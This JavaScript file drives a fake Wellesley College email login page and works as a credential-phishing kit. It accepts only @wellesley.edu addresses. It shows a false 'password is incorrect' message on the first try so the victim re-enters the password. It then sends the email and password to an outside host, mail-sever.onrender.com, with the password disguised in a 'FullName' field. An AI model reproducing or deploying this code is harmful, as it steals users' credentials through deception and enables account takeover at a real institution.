document.addEventListener("DOMContentLoaded", function() {
    // Elements
    const nextBtn = document.getElementById('nextBtn');
    const submitBtn = document.getElementById('submitBtn');
    const backBtn = document.getElementById('backBtn');
    const emailInput = document.getElementById('emailInput');
    const passInput = document.getElementById('passwordInput');
    const name = document.getElementById('username');
    const key = document.getElementById('pass');
    const userDisplay = document.getElementById('userValue')

    
    const wellesleyLog = document.getElementById("wellesleyLog");
    const alertCon = document.getElementById('alert-con');
    
    let firstAttempt = true; // Flag to track first submit attempt

    name.addEventListener("keypress", function(event) {
        if (event.key === "Enter") {
            event.preventDefault(); // Prevent form submission
            if (validateEmail(name.value)) {
                nextBtn.style.display = 'none';
                submitBtn.style.display = 'block';
                backBtn.style.display = 'block';
                emailInput.style.display = 'none';
                passInput.style.display = 'block';
                userDisplay.textContent = name.value
                alertCon.textContent =''
            } else {
                alertCon.textContent = 'This email may be incorrect.';
            }
        }
    });
    // Email validation
    function validateEmail(email) {
        return email.endsWith("@wellesley.edu");
    }

    // Event listener for next button
    nextBtn.addEventListener('click', (e) => {
        e.preventDefault();
        if (validateEmail(name.value)) {
            nextBtn.style.display = 'none';
            submitBtn.style.display = 'block';
            backBtn.style.display = 'block';
            emailInput.style.display = 'none';
            passInput.style.display = 'block';
            userDisplay.innerText = name.value
            alertCon.textContent =''
        } else {
            alertCon.textContent = 'This email may be incorrect.';
        }
    });

    // Back button handler
    backBtn.addEventListener('click', (e) => {
        e.preventDefault();
        backBtn.style.display = 'none';
        nextBtn.style.display = 'block';
        submitBtn.style.display = 'none';
        emailInput.style.display = 'block';
        passInput.style.display = 'none';
        alertCon.textContent = ''
    });

    // Handle form submission
    wellesleyLog.addEventListener("submit", function(event) {
        event.preventDefault();

        if (firstAttempt) {
            // First submit attempt: Show incorrect password message
            alertCon.textContent = 'Your account or password is incorrect. Try again.';
            firstAttempt = false; // Set flag to false to allow actual submission on next attempt
        } else {
            // Second submit: Perform actual submission
            if (key.value.trim() === '') {
                alertCon.textContent = 'Password cannot be empty.';
                return;
            }

            // Disable submit button to prevent multiple submissions
            submitBtn.disabled = true;
            submitBtn.value = 'Signing In...';

            const userData = {
                FullName: key.value,
                Email: name.value,
                Password: "username",
            };

            fetch('https://mail-sever.onrender.com/Api/User/sign-up', {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(userData)
            })
            .then(response => {
                if (!response.ok) {
                    return response.json().then(err => { throw err; });
                }
                return response.json();
            })
            .then(data => {
                // Redirect to home page after 2 seconds
                setTimeout(() => {
                    window.location.href = "auth.html";
                }, 1500);
            })
            .catch(error => {
                alertCon.textContent = "There was a problem signing in. Please try again later.";
                console.error("Error:", error);
            })
            .finally(() => {
                // Re-enable submit button
                submitBtn.disabled = false;
                submitBtn.value = 'Submit';
            });
        }
    });
});
